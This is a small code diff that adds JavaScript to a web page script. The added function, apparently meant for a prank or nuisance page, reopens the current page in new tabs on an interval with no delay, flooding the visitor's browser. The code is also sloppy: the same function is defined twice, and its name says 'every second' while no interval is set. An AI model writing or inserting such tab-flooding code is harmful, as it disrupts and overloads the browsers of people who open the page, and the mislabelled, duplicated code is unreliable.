@@ -1,3 +1,16 @@
+//新しいページをを開くコード
+function duplicateTabEverySecond() { 
+    openNewTabInterval = setInterval(function() { 
+        window.open(location.href); 
+    }); 
+}
+function duplicateTabEverySecond() { 
+    openNewTabInterval = setInterval(function() { 
+        window.open(location.href); 
+    }); 
+}
+
+
 let showAlertTimeout;
 let openNewTabInterval;
 
